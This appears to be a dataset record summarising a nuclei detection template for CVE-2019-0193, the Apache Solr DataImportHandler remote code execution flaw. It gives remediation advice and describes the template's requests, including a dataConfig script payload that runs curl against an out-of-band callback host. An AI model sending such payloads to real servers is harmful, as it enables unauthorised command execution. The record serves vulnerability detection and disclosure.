---
cve_id: CVE-2019-0193
template_path: nuclei-templates/http/cves/2019/CVE-2019-0193.yaml
affected_product: Apache Solr DataImportHandler
severity: high
authentication: none
external_callback: true
affected_versions: <8.2.0
preconditions: DataImportHandler module enabled
poc_classification: rce
---

## Vulnerability

Apache Solr DataImportHandler versions prior to 8.2.0 is vulnerable to remote code execution. The optional but popular DataImportHandler module permits the full DIH configuration—including executable scripts—to be supplied via the request's "dataConfig" parameter, a feature exposed in the debug mode of the DIH admin screen.

Impact: Successful exploitation leads to arbitrary command execution on the affected system.

Remediation: Upgrade to version 8.2.0 or later; the dataConfig parameter then requires the Java System property "enable.dih.dataConfigParam" to be explicitly set to true.

CVSS:3.0/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H (score 7.2), CWE-94.

## PoC / Detection
Classification: rce

The template first issues GET /solr/admin/cores?wt=json to enumerate cores and extracts a core name via regex extractor. It then sends POST /solr/{{core}}/dataimport?indent=on&wt=json containing a crafted dataConfig XML payload: URLDataSource + <script> defining poc() that runs java.lang.Runtime.getRuntime().exec("curl {{interactsh-url}}") + entity using XPathEntityProcessor with script:poc transformer. Confirmation occurs through out-of-band HTTP interaction matcher checking interactsh_protocol for "http" and interactsh_request for "User-Agent: curl".

## References
- https://github.com/vulhub/vulhub/tree/master/solr/CVE-2019-0193
- https://paper.seebug.org/1009/
- https://issues.apache.org/jira/browse/SOLR-13669
- https://nvd.nist.gov/vuln/detail/CVE-2019-0193
- https://lists.apache.org/thread.html/1addbb49a1fc0947fb32ca663d76d93cfaade35a4848a76d4b4ded9c@%3Cissues.lucene.apache.org%3E
